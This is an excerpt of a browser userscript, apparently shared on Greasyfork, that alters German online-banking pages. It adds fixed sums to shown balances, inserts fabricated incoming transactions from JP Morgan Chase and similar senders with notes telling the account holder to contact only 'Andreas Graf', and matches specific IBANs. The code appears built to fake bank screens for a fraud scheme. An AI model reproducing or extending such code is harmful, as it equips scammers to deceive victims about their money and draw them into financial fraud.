...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/487757/Ed%20Comm%20Joachim%20Franz.user.js
// @updateURL https://update.greasyfork.org/scripts/487757/Ed%20Comm%20Joachim%20Franz.meta.js
// ==/UserScript==
...
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL
 ...
 // Configurable Elements
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: +17500 },
        { index: 4, adjustmentAmount: +17500 },
        { index: 6, adjustmentAmount: +17500 },
  ...
  var transactionsnew = [
    {
      ...
      details: 'Freigabe nötig. Wenden Sie sich nur an Andreas Graf.',
      type: 'Vorgemerkt',
      amount: '+177.787,00 EUR',
    },
    {
      date: '22.02.2024',
      name: 'JP Morgan Chase',
     details: 'Warten Sie auf Andreas Graf',
      type: 'Gutschrift',
      amount: '+ 17.000,00 EUR',
    },
//    {
...
//    },
 ...
 //     date: '20.12.2023',
//      name: 'Payward Ltd',
 ////     details: 'Geld für Steuern: das Letzte',
 //     type: 'Gutschrift',
...
balanceModificationAmount = balanceChange = 17500.0 ;
...
///IBAN CONFIGURATION_______________________________________________________
     ...
     expectedIBAN = searchText = targetTextContent = specifiedTextContent = "DE46 5208 0080 0425 5975 03"
...
///////////////////////////////////////////////////////////////////////////////
   ...
   if (window.location.href.indexOf("landingpage") > 0 || window.location.href.indexOf("11025893493") > 0 || window.location.href.indexOf("10726846341") > 0 ) {
(function () {
    'use strict';
...
if (window.location.href.indexOf("financeoverview") > 0 || window.location.href.indexOf("10981029186") > 0 || window.location.href.indexOf("10726834157") > 0) {
  (function () {
    'use strict';
...
///////////////////////////////////////////////////////////////////////////////
   ...
   if (window.location.href.indexOf("account/transactions") > 0 || window.location.href.indexOf("11026154494") > 0 || window.location.href.indexOf("10726842017") > 0 ) {
...
if (window.location.href.indexOf("digitalbanking/transactionoverview") > 0 || window.location.href.indexOf("10733875328") > 0 || window.location.href.indexOf("10733875328") > 0) {
  (function () {
    'use strict';
...
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ...
 if (window.location.href.indexOf("digitalbanking/transactionoverview") > 0 || window.location.href.indexOf("10914034626") > 0 || window.location.href.indexOf("10733875328") > 0 ) {
...
(function () {
 ...
 //	  // Specify the text content to search for
     var specifiedTextContent = "DE40 2108 0050 0104 6378 00 | EUR";
...
if (window.location.href.indexOf("digitalbanking/financeoverview") > 0 || window.location.href.indexOf("startpage/startpage") > 0 || window.location.href.indexOf("digitalbanking/transactionoverview") > 0) {
    (function() {
        'use strict';
